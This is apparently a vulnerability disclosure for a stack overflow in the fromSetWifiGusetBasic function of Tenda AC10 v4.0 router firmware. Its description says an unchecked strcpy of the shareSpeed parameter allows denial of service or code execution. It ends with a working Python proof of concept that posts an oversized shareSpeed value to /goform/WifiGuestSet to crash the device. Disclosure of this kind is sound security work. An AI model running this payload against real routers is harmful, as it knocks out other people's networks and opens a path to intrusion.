# Tenda Router Vulnerability on fromSetWifiGusetBasic function

> vendor:Tenda
>
> product:AC10
>
> version:v4.0 V16.03.10.13 
>
> type:Stack Overflow  

## Vulnerability Description

Tenda AC10V4.0 V16.03.10.13 were discovered to contain a stack overflow via the `shareSpeed` parameter in the `fromSetWifiGusetBasic` function.

## Vulnerability Details

In function  `fromSetWifiGusetBasic`  line 30, it reads in a user-provided parameter  `shareSpeed` , and  it passed to the function `strcpy` without any length check, which may lead to overflow of the stack-based buffer `v10`. As a result, by requesting the page, an attacker can easily execute a **denial of service** attack or **remote code execution**.

![image-20231004155532591](assets/fromSetWifiGuestBasic_code.png)

## Recurring vulnerabilities and POC

Run this poc and you will see the service crash. The service will keep loading until it crashes.

```
import requests

ip = '192.168.0.1'
headers = {
    'Host': ip,
    'Accept': '*/*',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Connection': 'close',
}
junk = '1'*500
data = 'shareSpeed=' + junk
response = requests.post(
    f'http://{ip}/goform/WifiGuestSet',
    headers=headers,
    data=data,
    verify=False,
)

```
